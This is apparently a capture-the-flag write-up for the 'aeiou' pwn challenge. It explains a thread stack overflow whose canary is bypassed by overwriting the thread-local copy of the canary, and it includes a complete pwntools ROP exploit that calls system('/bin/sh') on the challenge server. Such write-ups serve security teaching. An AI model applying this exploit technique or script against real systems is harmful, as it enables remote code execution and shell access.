## aeiou

We are provided with a 64-bit Linux ELF binary, libc.so, and network address to exploit. The binary is a simple service with a menu. It is not PIE but it does have stack canaries.

After a quick review of each menu option, we focused on "Teaching numbers" which creates a thread with a trivial stack buffer overflow:

```
void *__fastcall teach_numbers_thread(void *a1)
{
  unsigned __int64 v2; // [rsp+8h] [rbp-1018h]
  char s[4096]; // [rsp+10h] [rbp-1010h]
  unsigned __int64 v4; // [rsp+1018h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(s, 0, 0x1000uLL);
  puts("Hello!");
  puts("Let me know the number!");
  v2 = read_number();
  if ( v2 <= 0x10000 )
  {
    readn(0, (__int64)s, v2);
    puts("Thank You :)");
  }
  else
  {
    puts("Too much :(");
  }
  return 0LL;
}
```

Notably, we can read up to 0x10000 bytes into a buffer that has space for only 0x1000 bytes.

The stack canary would normally make exploitation of this vulnerability difficult. Since the stack overflow is in a thread created with pthread\_create, we can overflow into the thread local structure that contains the correct stack canary value and corrupt its contents. See [https://bugzilla.redhat.com/show\_bug.cgi?id=1535038](https://bugzilla.redhat.com/show_bug.cgi?id=1535038).

One problem that we ran into after writing our exploit is that we overwrote too much of the thread local structure, so we caused the system function in libc to crash. Specifically, after the ```stack_guard``` field there is the ```pointer_guard``` field. So by overwriting just enough to overwrite the stack canary we avoided crashing in libc.

```
#!/usr/bin/env python
from pwn import *

pop_rbx_rbp_r12_r13_r14_r15 = 0x4026EA

buf  = 'A' * 0x1010
buf += ''.join(map(p64, [
    0,
    pop_rbx_rbp_r12_r13_r14_r15,
    0,
    1,
    0x603F80, # read .got
    0x10,
    0x604200, # address to store command string
    0,
    0x4026d0, # mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx * 8]
    0, # dummy
    0,
    1,
    0x603F68, # system .got
    0,
    0,
    0x604200, # argument to system
    0x4026d0, # mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx * 8]
]))
buf = buf.ljust(6128, 'A')

r = remote('110.10.147.109', 17777)
r.readuntil('>>')
r.sendline('3')
r.readuntil('Let me know the number!')
r.sendline(str(len(buf)))
r.send(buf)
r.readuntil('Thank You :)\n')
r.send('/bin/sh'.ljust(0x10, '\0'))
r.interactive()
```
